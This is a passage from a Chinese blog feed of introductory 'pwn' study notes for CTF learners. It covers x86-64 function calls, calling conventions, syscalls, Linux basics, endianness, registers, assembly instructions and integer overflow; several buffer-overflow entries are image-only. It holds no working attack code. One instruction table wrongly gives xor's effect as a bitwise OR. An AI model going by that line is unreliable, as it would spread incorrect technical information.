src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/5.png" alt="5.png"></p><h3 id="函数调用流程-8"><a href="#函数调用流程-8" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①func_a执行完毕返回后，栈布局如图：<br>②可以与之前的func_b未调用func_a前的栈帧对比<br>③一模一样，说明已经恢复了栈帧<br>④唯一不同之处此时的程序已经指向了c=1<br>⑤后面一条指令，说明func_a已经执行完毕</p><h3 id="函数调用流程-9"><a href="#函数调用流程-9" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①以此类推，func_b执行完毕返回后，栈布局如图：<br>②在这之后，main函数继续执行，直到结束<br>③至此，函数的调用返回执行流程结束。<br><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/6.png" alt="6.png"></p><h3 id="函数调用流程-10"><a href="#函数调用流程-10" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>①总结：<br>②调用函数：只需要将RIP压栈，即push rip，然后将rip赋值为被调用函数的起始地址，这一操作被隐性的内置在call指令中。<br>③被调用函数：push rbp ；mov rbp rsp ；sub rsp 0xxx。即保存调用函数的rbp指针，将自己的rbp指针指向栈顶，然后开辟栈空间给自己用，此时rbp就变成了被调用函数的栈底。<br>④函数返回：leave；ret；翻译过来就是：mov rsp rbp；pop rbp；pop rip；即恢复栈帧，返回调用函数的返回地址。</p><h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>1、返回值：一般来说，一个函数的返回值会存储到RAX寄存器中。<br>2、X86-64函数的调用约定为：<br>①从左到右参数一次传递给rdi，rsi，rdx，rcx，r8，r9。<br>②如果一个函数的参数多于6个，则从右到左压入栈中传递。</p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>syscall指令<br>①用于调用系统函数，调用时需要指明系统的调用号<br>②系统调用号存在rax寄存器中，然后不知好参数，执行syscall即可。</p><h3 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h3><p><img src="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/7.png" alt="7.png"></p><h3 id="示例：调用read-0-buf-size-；"><a href="#示例：调用read-0-buf-size-；" class="headerlink" title="示例：调用read(0,buf,size)；"></a>示例：调用read(0,buf,size)；</h3><p>mov rax,0；       read’s syscall number<br>mov rdi,0;          first arg<br>mov rsi,buf;       second arg<br>mov rdx,size;     third arg<br>syscall;               execute read(0,buf,size)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列2——计算机内部数据存储格式</title>
    <link href="/2021/06/29/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%972%E2%80%94%E2%80%94%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E9%83%A8%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E6%A0%BC%E5%BC%8F/"/>
    <url>/2021/06/29/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%972%E2%80%94%E2%80%94%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E9%83%A8%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E6%A0%BC%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="linux基础"><a href="#linux基础" class="headerlink" title="linux基础"></a>linux基础</h3><p>①保护层级：分为四个ring0-ring3<br>②一般来说就两个，0和3<br>③0为内核<br>④3为用户</p><h3 id="linux基础-1"><a href="#linux基础-1" class="headerlink" title="linux基础"></a>linux基础</h3><p>①权限：用户分为多个组<br>②文件和目录权限一般都是三个，即可读可写可执行<br>③读：R，写：W，执行：X<br>④赋予一个可执行文件执行权限就是chmod+x filename</p><h3 id="linux基础-2"><a href="#linux基础-2" class="headerlink" title="linux基础"></a>linux基础</h3><p>①虚拟内存和物理内存<br>②物理内存很直白，就是内存中实际的地址<br>③虚拟内存就是物理内存经过MMU转换后的地址<br>④系统会给每个用户进程分配一段虚拟内存空间<br>⑤所以说我们调试的可执行程序的内存空间布局都差不多，但是是虚拟内存，不是实际物理内存。</p><h3 id="linux基础命令"><a href="#linux基础命令" class="headerlink" title="linux基础命令"></a>linux基础命令</h3><p><strong>名称</strong>                         <strong>作用</strong>                              <strong>示例</strong><br>   ls                             列出当前目录                              ls<br>   cd                               切换目录                           cd/home/ctf<br>  pwd                          打印当前路径                              pwd<br>  touch                        创建空白文件                       touch flag.py<br>  mkdir                           创建目录                           mkdir  /home/ctf<br>  rmdir                            删除目录                           rmdir  /home/ctf<br>    rm                              删除文件                                rm flag<br>    cp                              复制文件                  cp /home/ctf/flag   /home/flag<br>    mv                             移动文件                  mv  flag  /home/ctf/flag<br>    cat                          输出文件内容                        cat  flag<br>   diff                        比较两个文件信息                 diff  flag1 flag2<br>   chmod                      切换执行权限                    chmod 777 elf1<br>   locate                         查找文件                         locate flag</p><h3 id="学会看源码"><a href="#学会看源码" class="headerlink" title="学会看源码"></a>学会看源码</h3><p>①linux是开源的，它的代码实现都可以找到<br>②我们研究linux的机制，最重要的武器就是源码<br>③分析源码是一个安全研究者必备的技能<br>④<a href="https://elixir.bootlin.com/">https://elixir.bootlin.com</a><br>⑤<a href="https://code.woboq.org/">https://code.woboq.org</a></p><h3 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h3><p>①计算机内部有两种数据的存储形式：大端序和小端序<br>②大端序：数据高位存储在计算机地址的低位，数据低位存储在计算机地址的高位<br>③小端序：数据高位存储在计算机地址的高位，数据低位存储在计算机地址的低位</p><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>①Linux系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已经被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。<br>②每个文件描述符会与一个打开的文件相对应，不同的文件描述符也可能指向同一个文件<br>③相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开。</p><h3 id="文件描述符-1"><a href="#文件描述符-1" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>①我们会在open、read、write这些常见函数中见到<br>②0标准输入(标准输入)、1标准输出(stdout)、2标准错误(stderr)<br>③read(0,buf,size)从stdin中读size个数据到buf中。<br>④write(1,buf,size)从buf中取出size个数据到stdout中。</p><h3 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h3><p>①栈是一种数据结构，他是一种后进先出(LIFO)的数据结构<br>②栈的基本操作有两种：push（压栈）和pop（弹栈）<br>③由于函数调用顺序也是LIFO，所以我们能接触到的绝大多数系统，都是通过栈这一数据结构来维护函数调用关系。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn入门系列1——汇编语言基础</title>
    <link href="/2021/06/28/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%971%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/06/28/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%971%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="一些量词"><a href="#一些量词" class="headerlink" title="一些量词"></a>一些量词</h3><p>bit          比特     1位<br>byte       字节      8位<br>word      字         16位<br>dword    双字      32位<br>qword    四字      64位</p><h3 id="计算机寻址方式"><a href="#计算机寻址方式" class="headerlink" title="计算机寻址方式"></a>计算机寻址方式</h3><p>① 当前主流操作系统中，都是以字节为寻址单位进行寻址<br>②意味着计算机访问的最小单位是一个字节</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>①计算机并不能直接运行高级语言<br>②我们编写的高级语言程序需要进行编译后才能在计算机上运行<br>③高级语言经过编译之后，经过编译器处理，被打包成一个可执行文件的格式<br>④那么，计算机真正能够被运行的是什么</p><h3 id="机器码——0和1"><a href="#机器码——0和1" class="headerlink" title="机器码——0和1"></a>机器码——0和1</h3><p>①深入底层后，计算机其实很笨，只能完成一些很基本的操作，但是速度很快。<br>②机器码就是一个个0和1组成的，为了方便人类的阅读，一般都以16进制呈现。<br>③尽管如此，一个个16进制字符可读性仍然很差<br>④汇编语言就是把这些及其指令代码以助记符的形式翻译一下，方便人类的阅读。</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>①计算机的指令都是由CPU来执行<br>②在计算机系统结构中，CPU和内存是分开的。<br>③寄存器存在于CPU中，是CPU的直接操作对象。</p><h3 id="寄存器种类"><a href="#寄存器种类" class="headerlink" title="寄存器种类"></a>寄存器种类</h3><p><strong>寄存器名称</strong>               <strong>作用</strong>                                           <strong>备注</strong><br>      RAX                       通用寄存器                    低32位：EAX ；低16位：AX；高8位：AH；低8位：AL<br>      RBX                       通用寄存器                                           同上<br>      RCX                       通用寄存器                                           同上<br>      RDX                       通用寄存器                                           同上<br>      RDI                        通用寄存器                                      低32位：EDI<br>      RSI                         通用寄存器                                           同上<br>      R8                          通用寄存器                    低32位：R8d；低16位：R8W；低8位：R8B<br>      R9                          通用寄存器                                           同上<br>      R10                        通用寄存器                                           同上<br>      R11                        通用寄存器                                           同上<br>      R12                        通用寄存器                                           同上<br>      R13                        通用寄存器                                           同上<br>      R14                        通用寄存器                                           同上<br>      R15                        通用寄存器                                           同上</p><h3 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h3><p>①上述的通用寄存器，通常用于参数传递以及算数运算等通用场合<br>②RSP为栈顶指针，RBP为栈底指针，二者用于维护程序运行时的函数栈<br>③EFLAGS为标志位寄存器，用于存储CPU运行时计算过程中的状态，如进位溢出等。<br>④RIP指针用于存储CPU下一条将会执行的指针，不能直接修改，正常情况下会每一次运行一条指令自增一条指令的长度，当发生跳转时才会以其他形式改变其值。</p><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><p><strong>寻址方式</strong>                          <strong>示例</strong>                               <strong>实际访问</strong><br>   立即寻址                              1234h                             1234h这个数字本身<br>   直接寻址                              [1234h]                              内存地址1234h<br>  寄存器寻址                             RAX                                  访问RAX寄存器<br>寄存器间接寻址                        [RAX]                    访问RAX寄存器存储的值的这一内存地址<br>   变址寻址                               [RAX+1234h]     访问RAX寄存器存储的值+1234h这一内存地址</p><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>①计算机只能完成很基本的操作。这些操作大多是对一些寄存器的值进行修改<br>②这些指令通过排列组合，完成复杂的功能<br>③两种格式Intel和AT&amp;T<br>④二者的差别主要在于源和目的操作数顺序上<br>⑤可以通过立即数寻址来进行判断</p><h3 id="汇编指令-1"><a href="#汇编指令-1" class="headerlink" title="汇编指令"></a>汇编指令</h3><p><strong>指令类型</strong>            <strong>操作码</strong>       <strong>例子(intel格式)</strong>           <strong>实际效果</strong><br>  数据传送指令            mov                 mov rax rbx                     rax=rbx<br>  取地址指令      lea                   lea rax [rbx]                     rax=&amp;*rbx<br>  算数运算指令            add                  add rax rbx                      rax=rax+rbx<br>                                 sub                   sub rax rbx                      rax=rax-rbx<br>  逻辑运算指令            and                  and rax rbx                      rax=rax&amp;rbx<br>                                 xor                    xor rax rbx                      rax=rax | rbx<br>  函数调用指令            call                   call 1234h                    执行内存地址1234h处的函数<br>  函数返回指令            ret                        ret                               函数返回<br>       比较                    cmp                 cmp rax rbx                  比较rax与rbx，结果保存在EFLAG寄存器<br>  无条件跳转               jmp                  jmp  1234h                       eip=1234h<br>  栈操作指令               push                push rax                        将rax存储的值压栈<br>                                 pop                 pop rax                          将栈顶的值赋值给rax,rsp+=8</p><h3 id="汇编指令-2"><a href="#汇编指令-2" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>①不难发现两个操作数指令的目的寄存器都是第一个寄存器<br>②call和jmp指令看起来效果一样，但是描述却有些不同<br>③call的话是调用，需要一些函数地址的保存压栈参数传递的操作<br>④jmp指令类似于函数中的if else语句，只设计跳转，不能作为函数调用来使用<br>⑤另外在pop时rsp是+8而不是-8</p><h3 id="汇编指令-3"><a href="#汇编指令-3" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>①计算机在执行汇编代码时，只会顺序执行<br>②通过call、jmp、ret指令来完成跳转<br>③所有汇编指令代码的执行流并不像高级语言程序一样流程明确<br>④汇编代码的经常性跳转会导致可读性差</p><h3 id="汇编指令-4"><a href="#汇编指令-4" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int a=0</span><br><span class="line"><span class="keyword">while</span>(a&lt;100)</span><br><span class="line">a++；</span><br><span class="line">a=0</span><br></pre></td></tr></table></figure><p>翻译成汇编</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0 //int a=0</span><br><span class="line">label1:</span><br><span class="line">inc rax; //a++</span><br><span class="line">cmp rax 100</span><br><span class="line">jge label2;  // <span class="keyword">if</span> a&gt;=100,<span class="built_in">break</span></span><br><span class="line">jmp label1; //loop</span><br><span class="line">label2:</span><br><span class="line">mov rax , 0</span><br></pre></td></tr></table></figure><h3 id="汇编指令-5"><a href="#汇编指令-5" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>①这里的jge是通过eflag寄存器中的标志位来判断<br>②而eflag标志位是通过cmp来设置</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>①int a,b //存放于rax和rbx中<br>②两种swap方式：<br>    第一种：int c=a;a=b;b=c<br>    第二种：a=a+b;b=a-b;a=a-b;</p><h3 id="深入到汇编"><a href="#深入到汇编" class="headerlink" title="深入到汇编"></a>深入到汇编</h3><p>①第一种方式相当于：<br>mov rcx rax;<br>mov rax rbx;<br>mov rbx rcx;<br>②第二种方式相当于：<br>add rax rbx;<br>mov rcx rax;<br>sub rcx rbx;<br>mov rbx rcx;<br>sub rax rbx;</p><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p>①从高级语言层面看：<br>第一种方式申请了一个变量c，第二种直接在原本的变量上操作<br>②从汇编语言层面上看：<br>第一种指令数少，而第二种方式涉及到算术运算指令。<br>③从结果上看，可以直接：xchg rax rbx</p><h3 id="在CTF中需要掌握到什么程度"><a href="#在CTF中需要掌握到什么程度" class="headerlink" title="在CTF中需要掌握到什么程度"></a>在CTF中需要掌握到什么程度</h3><p>①能看懂就行，绝大多数情况下不需要真正的编程（shellcode题目除外）<br>②IDA F5有时候不需要读汇编<br>③通常都是分析gadget,知道怎么用<br>④调试程序也不需要分析每一条汇编指令，单步执行然后查看寄存器状态即可。<br>⑤但是必须得会汇编，学PWN必须得会汇编</p><h3 id="数"><a href="#数" class="headerlink" title="数"></a>数</h3><p>①数学是科学的基石，任何科技都离不开数学的支撑<br>②在计算机中，无论数据是以二进制或者十六进制十进制表示，本质上都是代表一个数<br>③尽管数据在计算机内部有很多存储形式（补码、原码、反码等）。但是本质上都是数。</p><h3 id="数-1"><a href="#数-1" class="headerlink" title="数"></a>数</h3><p>计算机不能存储无限大的数，这个数的数值有一定的上限和下限。<br><img src="/2021/06/28/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%971%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/1.png" alt="1.png"></p><h3 id="数-2"><a href="#数-2" class="headerlink" title="数"></a>数</h3><p>①如果是Unsigned也就是无符号数，数据的每一位都是代表数据。<br>②如果是signed有符号数，那么数据的最高位会被当做符号位处理。<br>③0代表正数，1代表负数。</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>①数值有上下限范围，那么就不可避免的会有溢出情况<br>②以32位int为例，有以下四种溢出：<br>无符号上溢：0xffffffff+1变成0<br>无符号下溢：0-1变成0xffffffff<br>有符号上溢：有符号正数0x7fffffff+1变成负数0x80000000<br>有符号下溢：有符号数0x80000000-1变成正数0x7fffffff</p><h3 id="溢出-1"><a href="#溢出-1" class="headerlink" title="溢出"></a>溢出</h3><p>这就是整数溢出，原因如下两点：<br>①存储位数不够<br>②溢出到符号位<br>整数溢出一般配合别的漏洞来使用。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>漏洞挖掘技术</title>
    <link href="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/"/>
    <url>/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/1.png" alt="1.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/2.png" alt="2.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/3.png" alt="3.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/4.png" alt="4.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/5.png" alt="5.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/6.png" alt="6.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/7.png" alt="7.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/8.png" alt="8.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/9.png" alt="9.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/10.png" alt="10.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/11.png" alt="11.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/12.png" alt="12.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/13.png" alt="13.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/14.png" alt="14.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/15.png" alt="15.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/16.png" alt="16.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/17.png" alt="17.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/18.png" alt="18.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/19.png" alt="19.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/20.png" alt="20.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/21.png" alt="21.png"><br><img src="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/22.png" alt="22.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux缓冲区溢出</title>
    <link href="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/1.png" alt="1.png"><br><img src="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/2.png" alt="2.png"><br><img src="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/3.png" alt="3.png"><br><img src="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.png" alt="4.png"><br><img src="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/5.png" alt="5.png"><br><img src="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/6.png" alt="6.png"><br><img src="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/7.png" alt="7.png"><br><img src="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/8.png" alt="8.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows缓冲区溢出</title>
    <link href="/2021/06/25/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2021/06/25/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/25/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/1.png" alt="1.png"><br><img src="/2021/06/25/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/2.png" alt="2.png"><br><img src="/2021/06/25/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/3.png" alt="3.png"><br><img src="/2021/06/25/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.png" alt="4.png"><br><img src="/2021/06/25/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/5.png" alt="5.png"><br><img src="/2021/06/25/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/6.png" alt="6.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>缓冲区溢出原理</title>
    <link href="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/"/>
    <url>/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/1.png" alt="1.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/2.png" alt="2.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/3.png" alt="3.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/4.png" alt="4.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/5.png" alt="5.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/6.png" alt="6.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/7.png" alt="7.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/8.png" alt="8.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/9.png" alt="9.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/10.png" alt="10.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/11.png" alt="11.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/12.png" alt="12.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/13.png" alt="13.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/14.png" alt="14.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/15.png" alt="15.png"><br><img src="/2021/06/24/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86/16.png" alt="16.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制软件逆向分析工具及实战</title>
    <link href="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/"/>
    <url>/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/1.png" alt="1.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/2.png" alt="2.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/3.png" alt="3.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/4.png" alt="4.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/5.png" alt="5.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/6.png" alt="6.png"><br><img src="/2021/06/23/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%AE%9E%E6%88%98/7.png" alt="7.png"><br><img 